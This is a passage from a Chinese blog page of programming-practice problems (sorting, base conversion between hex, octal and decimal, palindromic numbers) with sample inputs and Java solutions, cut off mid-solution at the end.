class="line">说明：“样例输入”给出了一组满足“输入格式”要求的输入的例子。</span><br><span class="line"></span><br><span class="line">这里给出的输入只是可能用来测试你的程序的一个输入，在测试的时候，还会有更多的输入用来测试你的程序。</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">57</span><br><span class="line">说明：“样例输出”给出了一组满足“输出格式”要求的输出的例子。</span><br><span class="line"></span><br><span class="line">样例输出中的结果是和样例输入中的是对应的，因此，你可以使用样例的输入输出简单的检查你的程序。</span><br><span class="line"></span><br><span class="line">要特别指出的是，能够通过样例输入输出的程序并不一定是正确的程序，在测试的时候，会用很多组数据进行测试，而不局限于样例数据。有可能一个程序通过了样例数据，但测试的时候仍只能得0分，可能因为这个程序只在一些类似样例的特例中正确，而不具有通用性，再测试更多数据时会出现错误。</span><br><span class="line"></span><br><span class="line">比如，对于本题，如果你写一个程序不管输入是什么都输入57，则样例数据是对的，但是测试其他数据，哪怕输入是1和2，这个程序也输出57，则对于其他数据这个程序都不正确。</span><br><span class="line"></span><br><span class="line">数据规模与约定</span><br><span class="line">-10000 &lt;= A, B &lt;= 10000。</span><br><span class="line">说明：“数据规模与约定”中给出了试题中主要参数的范围。</span><br><span class="line"></span><br><span class="line">这个范围对于解题非常重要，不同的数据范围会导致试题需要使用不同的解法来解决。比如本题中给的A、B范围不大，可以使用整型(int)来保存，如果范围更大，超过int的范围，则要考虑其他方法来保存大数。</span><br><span class="line"></span><br><span class="line">有一些范围在方便的时候是在“问题描述”中直接给的，所以在做题时不仅要看这个范围，还要注意问题描述。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">long</span> a = in.nextLong();</span><br><span class="line">        <span class="keyword">long</span> b = in.nextLong();</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基础练习"><a href="#基础练习" class="headerlink" title="基础练习"></a>基础练习</h2><h3 id="BASIC-13-数列排序"><a href="#BASIC-13-数列排序" class="headerlink" title="BASIC-13 数列排序"></a>BASIC-13 数列排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定一个长度为n的数列，将这个数列按从小到大的顺序排列。1&lt;=n&lt;=200</span><br><span class="line">输入格式</span><br><span class="line">　　第一行为一个整数n。</span><br><span class="line">　　第二行包含n个整数，为待排序的数，每个整数的绝对值小于10000。</span><br><span class="line">输出格式</span><br><span class="line">　　输出一行，按从小到大的顺序输出排序后的数列。</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">8 3 6 4 9</span><br><span class="line">样例输出</span><br><span class="line">3 4 6 8 9</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> len = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">200</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++)&#123;</span><br><span class="line">            arr[i]=in.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(arr,<span class="number">0</span>,len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len;j++)&#123;</span><br><span class="line">            System.out.print(arr[j]+<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-12-十六进制转八进制"><a href="#BASIC-12-十六进制转八进制" class="headerlink" title="BASIC-12 十六进制转八进制"></a>BASIC-12 十六进制转八进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定n个十六进制正整数，输出它们对应的八进制数。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">　　输入的第一行为一个正整数n （1&lt;=n&lt;=10）。</span><br><span class="line">　　接下来n行，每行一个由0~9、大写字母A~F组成的字符串，表示要转换的十六进制正整数，每个十六进制数长度不超过100000。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">　　输出n行，每行为输入对应的八进制正整数。</span><br><span class="line"></span><br><span class="line">　　【注意】</span><br><span class="line">　　输入的十六进制数不会有前导0，比如012A。</span><br><span class="line">　　输出的八进制数也不能有前导0。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">　　2</span><br><span class="line">　　39</span><br><span class="line">　　123ABC</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">　　71</span><br><span class="line">　　4435274</span><br><span class="line"></span><br><span class="line">　　【提示】</span><br><span class="line">　　先将十六进制数转换成某进制数，再由某进制数转换成八进制。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">法一：(先转成十进制，再转八进制，不能满分)</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        String[] arry = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            String num = in.next();</span><br><span class="line">            arry[i] = Long.toOctalString(Long.parseLong(num,<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            System.out.println(arry[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------</span><br><span class="line"></span><br><span class="line">法二：改造算法，先转二进制，再转八进制</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">binaryTransform</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>[][] arry, String[] arryBinaryStr)</span> </span>&#123;</span><br><span class="line">        String[] arryOctalStr = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arryBinaryStr[i] = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arry[i].length; j++) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (arry[i][j]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0000"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0001"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0010"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0011"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0100"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0101"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0110"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'7'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"0111"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'8'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1000"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'9'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1001"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1010"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1011"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1100"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1101"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1110"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                        arryBinaryStr[i] = arryBinaryStr[i] + <span class="string">"1111"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arryBinaryStr[i].length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                arryBinaryStr[i] = <span class="string">"00"</span> + arryBinaryStr[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arryBinaryStr[i].length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                arryBinaryStr[i] = <span class="string">"0"</span> + arryBinaryStr[i];</span><br><span class="line">            &#125;</span><br><span class="line">            arryOctalStr[i] = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arryBinaryStr[i].length() / <span class="number">3</span>; j++) &#123;</span><br><span class="line">                str = arryBinaryStr[i].substring(j * <span class="number">3</span>, j * <span class="number">3</span> + <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">switch</span> (str) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"000"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"0"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"001"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"1"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"010"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"2"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"011"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"3"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"100"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"4"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"101"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"5"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"110"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"6"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">"111"</span>:</span><br><span class="line">                        arryOctalStr[i] += <span class="string">"7"</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            str = arryOctalStr[i].substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (str.equals(<span class="string">"0"</span>)) &#123;</span><br><span class="line">                System.out.println(arryOctalStr[i].substring(<span class="number">1</span>,</span><br><span class="line">                        arryOctalStr[i].length()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(arryOctalStr[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = sc.nextInt();</span><br><span class="line">        <span class="keyword">char</span>[][] arry = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>][<span class="number">100000</span>];</span><br><span class="line">        String[] arryBinaryStr = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">        String number;</span><br><span class="line">        <span class="keyword">if</span> (n &gt;= <span class="number">1</span> &amp;&amp; n &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                number = sc.next();</span><br><span class="line">                arry[i] = number.toCharArray();</span><br><span class="line">            &#125;</span><br><span class="line">            binaryTransform(n, arry, arryBinaryStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-11-十六进制转十进制"><a href="#BASIC-11-十六进制转十进制" class="headerlink" title="BASIC-11 十六进制转十进制"></a>BASIC-11 十六进制转十进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　从键盘输入一个不超过8位的正的十六进制数字符串，将它转换为正的十进制数后输出。</span><br><span class="line">　　注：十六进制数中的10~15分别用大写的英文字母A、B、C、D、E、F表示。</span><br><span class="line">样例输入</span><br><span class="line">FFFF</span><br><span class="line">样例输出</span><br><span class="line">65535</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String num = in.next();</span><br><span class="line"><span class="comment">//        System.out.println(Integer.valueOf(num,16));</span></span><br><span class="line">        System.out.println(Long.parseLong(num,<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-10-十进制转十六进制"><a href="#BASIC-10-十进制转十六进制" class="headerlink" title="BASIC-10 十进制转十六进制"></a>BASIC-10 十进制转十六进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　十六进制数是在程序设计时经常要使用到的一种整数的表示方式。它有0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F共16个符号，分别表示十进制数的0至15。十六进制的计数方法是满16进1，所以十进制数16在十六进制中是10，而十进制的17在十六进制中是11，以此类推，十进制的30在十六进制中是1E。</span><br><span class="line">　　给出一个非负整数，将它表示成十六进制的形式。</span><br><span class="line">输入格式</span><br><span class="line">　　输入包含一个非负整数a，表示要转换的数。0&lt;=a&lt;=2147483647</span><br><span class="line">输出格式</span><br><span class="line">　　输出这个整数的16进制表示</span><br><span class="line">样例输入</span><br><span class="line">30</span><br><span class="line">样例输出</span><br><span class="line">1E</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String num = in.next();</span><br><span class="line">        System.out.println(Long.toHexString(Long.parseLong(num,<span class="number">10</span>)).toUpperCase());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-9-特殊回文数"><a href="#BASIC-9-特殊回文数" class="headerlink" title="BASIC-9 特殊回文数"></a>BASIC-9 特殊回文数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　123321是一个非常特殊的数，它从左边读和从右边读是一样的。</span><br><span class="line">　　输入一个正整数n， 编程求所有这样的五位和六位十进制数，满足各位数字之和等于n 。</span><br><span class="line">输入格式</span><br><span class="line">　　输入一行，包含一个正整数n。</span><br><span class="line">输出格式</span><br><span class="line">　　按从小到大的顺序输出满足条件的整数，每个整数占一行。</span><br><span class="line">样例输入</span><br><span class="line">52</span><br><span class="line">样例输出</span><br><span class="line">899998</span><br><span class="line">989989</span><br><span class="line">998899</span><br><span class="line">数据规模和约定</span><br><span class="line">　　1&lt;=n&lt;=54。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> sum = in.nextInt();</span><br><span class="line">        StringBuffer str = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取前三位</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">10</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; <span class="number">10</span>;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i*<span class="number">2</span> + j*<span class="number">2</span> + k*<span class="number">2</span> == sum)&#123;</span><br><span class="line">                        str.append(i*<span class="number">100000</span>+j*<span class="number">10000</span>+k*<span class="number">1000</span>+k*<span class="number">100</span>+j*<span class="number">10</span>+i);</span><br><span class="line">                        str.append(<span class="string">','</span>);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i*<span class="number">2</span>+j*<span class="number">2</span>+k == sum)&#123;</span><br><span class="line">                        str.append(i*<span class="number">10000</span>+j*<span class="number">1000</span>+k*<span class="number">100</span>+j*<span class="number">10</span>+i);</span><br><span class="line">                        str.append(<span class="string">','</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以,转成字符串数组</span></span><br><span class="line">        String[] strArr = str.toString().split(<span class="string">","</span>);</span><br><span class="line">        <span class="comment">// 将字符串数组转成int数组</span></span><br><span class="line">        <span class="keyword">int</span>[] intArr = <span class="keyword">new</span> <span class="keyword">int</span>[strArr.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> m = <span 